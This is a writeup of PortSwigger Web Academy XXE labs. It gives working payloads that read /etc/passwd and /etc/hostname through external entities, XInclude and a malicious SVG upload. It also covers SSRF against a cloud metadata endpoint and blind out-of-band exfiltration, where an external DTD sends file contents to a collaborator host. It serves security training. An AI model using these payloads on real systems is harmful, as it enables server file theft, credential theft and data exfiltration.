---
title: (Portswigger/WebAcademy) - XXE Injection
author:
  name: eng4ge
  link: https://github.com/an9k0r
date: 2022-10-27 09:00:00 +0200
categories: [Web Application, XXE Injection]
tags: [Notes, Web Application, Portswigger]
math: true
mermaid: true
image:
  src: 
  width: 694
  height: 515
  alt: image alternative text
---
# Intro
This post/writeup is all about the XXE Injection.

I'll be using primarily [Portswigger Web Academy](https://portswigger.net/web-security/xxe) Labs, but i do intent do throw other labs and writeups here as well.

What can we do with XXE-based vulnerabilites:
- retrieve files, where an external entity is defined containing the contents of a file, and returned in the application's response.
- perform SSRF attacks, where an external entity is defined based on a URL to a back-end system.
- exfiltrate data out-of-band, where sensitive data is transmitted from the application server to a system that the attacker controls.
-  retrieve data via error messages, where the attacker can trigger a parsing error message containing sensitive data.

## TOC
- [Intro](#intro)
  - [TOC](#toc)
- [Exploiting XXE using external entities to retrieve files](#exploiting-xxe-using-external-entities-to-retrieve-files)
- [Exploiting XXE to perform SSRF attacks](#exploiting-xxe-to-perform-ssrf-attacks)
- [Exploiting XInclude to retrieve files](#exploiting-xinclude-to-retrieve-files)
- [Exploiting XXE via image file upload](#exploiting-xxe-via-image-file-upload)
- [Blind XXE with out-of-band interaction via XML parameter entities](#blind-xxe-with-out-of-band-interaction-via-xml-parameter-entities)
- [Blind XXE with out-of-band interaction](#blind-xxe-with-out-of-band-interaction)
- [Exploiting blind XXE to exfiltrate data using a malicious external DTD](#exploiting-blind-xxe-to-exfiltrate-data-using-a-malicious-external-dtd)
- [Exploiting blind XXE to retrieve data via error messages](#exploiting-blind-xxe-to-retrieve-data-via-error-messages)

# Exploiting XXE using external entities to retrieve files

>  This lab has a "Check stock" feature that parses XML input and returns any unexpected values in the response.
> 
> To solve the lab, inject an XML external entity to retrieve the contents of the /etc/passwd file. 

Checking the instructions, we're supposed to check the `Check stock` feature, so let's do that and have Burp running in the background.

![picture 88](/assets/images/777853f2dca23553816522d04d499702489586634bc4de129e2bdf70d3766e5a.png)  

That's the payload that will be used:
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck><productId>&xxe;</productId>
<storeId>&xxe;</storeId>
</stockCheck>
```

![picture 89](/assets/images/053e784ba1e648de41b08fba2ec4610c18c15ce14dcb2c2af0f8ce5d95035cf5.png)  

And we'we got the contents of `/etc/passwd` back!

# Exploiting XXE to perform SSRF attacks
>  This lab has a "Check stock" feature that parses XML input and returns any unexpected values in the response.
> 
> The lab server is running a (simulated) EC2 metadata endpoint at the default URL, which is http://169.254.169.254/. This endpoint can be used to retrieve data about the instance, some of which might be sensitive.
> 
> To solve the lab, exploit the XXE vulnerability to perform an SSRF attack that obtains the server's IAM secret access key from the EC2 metadata endpoint. 

We have to try to achieve SSRF, so let's start with checking the `Check stock` feature:

![picture 90](/assets/images/954e7739686c3328c8370ba4d699b7be4603e8a687486765b6ee9ddfed757e5a.png)  

Let's try to exploit SSRF using XXE Vulnerability

![picture 91](/assets/images/0394209e54deae27e40549d819691a9e716e94382d306b8c260b8c61af411b0e.png)  

We can see that we get `latest` return which is folder. We can get to admin-key in few iterations:

![picture 92](/assets/images/80feda92882deb816f18bd4596a3de7ad755e74716a018c78ac6191323647fa3.png)  

As soon as we reach the secret access key, lab will get solved.

# Exploiting XInclude to retrieve files
>  This lab has a "Check stock" feature that embeds the user input inside a server-side XML document that is subsequently parsed.
> 
> Because you don't control the entire XML document you can't define a DTD to launch a classic XXE attack.
> 
> To solve the lab, inject an XInclude statement to retrieve the contents of the /etc/passwd file. 

We know that `Check stock` is vulnerable, so let's use it and check the request in Burp.

![picture 93](/assets/images/92e4e0d678e7eac3acb0c69e6884c66336072e52d5fd3fc65031546eab16bb12.png)  

We will inject the payload inthe the `productId` value:

```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>
```

![picture 94](/assets/images/a14b874d3954970e5e0dedb5534e5b9dd79fccc6a11b3e7e2f5e01554e716a38.png)  

Lab has been solved!

# Exploiting XXE via image file upload

>  This lab lets users attach avatars to comments and uses the Apache Batik library to process avatar image files.
> 
> To solve the lab, upload an image that displays the contents of the /etc/hostname file after processing. Then use the "Submit solution" button to submit the value of the server hostname. 

In this lab we have to upload malicious SVG as avatar. We have to create SVG File beforehand:

```xml
<?xml version="1.0" standalone="yes"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]><svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-size="16" x="0" y="16">&xxe;</text></svg>
```

Save that as SVG and upload as avatar:
![picture 95](/assets/images/642512d15ef090c1e7f78f1748b3184d40208340be8b5a9b9a49bac98dc4fe09.png)  

When checking the avatar on the post, image with file contents should appear.

![picture 96](/assets/images/fc2ef080d5dac7ee1a32779ca83d54084849da6c40999cd7f1ccb3148b141721.png)  

Submit hostname as solution in order to solve the lab.

# Blind XXE with out-of-band interaction via XML parameter entities

> This lab has a "Check stock" feature that parses XML input, but does not display any unexpected values, and blocks requests containing regular external entities.
> 
> To solve the lab, use a parameter entity to make the XML parser issue a DNS lookup and HTTP request to Burp Collaborator.

This lab is all about blind XXE so we won't get any direct response to our payloads.

![picture 0](/assets/images/01dc48997e2ce2be9fcef3eb07ffeea83252de88c9c40903d79b017f740e8ca3.png)  

Callback:

![picture 1](/assets/images/9f750ecd810b5944c400d7fe6e2fca079489b7343e7af36f661f83be63732ced.png)  

Lab has been solved.

# Blind XXE with out-of-band interaction
> This lab has a "Check stock" feature that parses XML input but does not display the result.
> 
> You can detect the blind XXE vulnerability by triggering out-of-band interactions with an external domain.
> 
> To solve the lab, use an external entity to make the XML parser issue a DNS lookup and HTTP request to Burp Collaborator.

To solve this lab, we have to put the DOCTYPE after the xml declaration or else the payload will not work!.

![picture 2](/assets/images/018de34bdf5b9a8e2d0d168116a7bcd947312449e792cd9d92887c96b1fc74f7.png)  

# Exploiting blind XXE to exfiltrate data using a malicious external DTD
> This lab has a "Check stock" feature that parses XML input but does not display the result.
To solve the lab, exfiltrate the contents of the /etc/hostname file.

For this lab, the same vulnerability exist in the "Check stock" functionality.

If we try to put entities, we will get an error.

When sending an XML like this, we'll get a callback.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE stockCheck [ <!ENTITY % xxe SYSTEM "http://fyhkrxyhswt25ohovyzz9ovojfp6d11q.oastify.com/test.dtd"> %xxe;]>
<stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>
```

Now we need to put test.dtd on our exploit server.

```xml
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'https://g5mlyy5izx03cpop2z60gp2pqgw7k38s.oastify.com/?x=%file;'>">
%eval;
%exfil;
```

If everything has been done right, callback with an hostname should pop in the collaborator.

# Exploiting blind XXE to retrieve data via error messages
> This lab has a "Check stock" feature that parses XML input but does not display the result.
> 
> To solve the lab, use an external DTD to trigger an error message that displays the contents of the /etc/passwd file.
> 
> The lab contains a link to an exploit server on a different domain where you can host your malicious DTD.

Same as previous lab, we first can check if we get a callback, which by using following query IS the case.

![picture 3](/assets/images/87e668223f3d8ba52a95feba6400ad3a27489a2b532d4be43d40c4e89aadbcc3.png)  

We'll use following payload on the remote server serving malicious `dtd` file, in order to print the contents of a local file `/etc/passwd`:

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```

![picture 4](/assets/images/930cb6ce0e05e5eef061ec1bf78d35b6f8937ea3e9c843f92888c36ddc57fb4d.png)  


